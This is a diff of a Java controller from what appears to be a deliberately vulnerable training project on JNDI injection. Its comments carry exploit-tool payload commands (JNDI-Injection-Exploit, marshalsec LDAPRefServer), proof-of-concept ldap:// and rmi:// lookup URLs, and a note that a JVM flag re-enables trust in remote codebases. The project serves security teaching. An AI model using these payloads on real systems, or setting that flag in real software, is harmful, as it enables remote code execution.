@@ -1,4 +1,4 @@
-package com.madaha.codesecone.controller.jndi;
+package com.madaha.codesecone.controller.jndi.RmiInject_Controller;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -9,12 +9,16 @@ import org.springframework.web.util.HtmlUtils;
 
 import javax.naming.Context;
 import javax.naming.InitialContext;
-import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 
 /**
  * JNDI注入攻击，其实就是相当于远程类加载，把远程的Class对象加载到本地执行，造成RCE。
+ *
+ * jndi注入可利用范围，注意：
+ *    - JDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为false，
+ *    - 运行时需加入参数 -Dcom.sun.jndi.rmi.object.trustURLCodebase=true 。
+ *    - 因为如果 JDK 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 RMI 代码。
  */
 @RestController
 @RequestMapping("/JNDI")
@@ -28,11 +32,11 @@ public class JNDIInject {
      * @payload-1 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open -a Calculator" -A 127.0.0.1
      * @payload-2 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:65500/\#Exploit
      *
+     *
      * @poc-ldap http://127.0.0.1:28888/JNDI/vul?content=ldap://127.0.0.1:1389/Object
-     * @poc-rmi http://127.0.0.1:28888/JNDI/vul?content=rmi://127.0.0.1:1099/Object
+     * @poc-rmi http://127.0.0.1:28888/JNDI/vul?content=rmi://127.0.0.1:1099/RCE
      *
      * 注意：默认注册时配置，ldap 1389端口，rmi 1099端口；
-     *
      * @param content
      * @return
      */
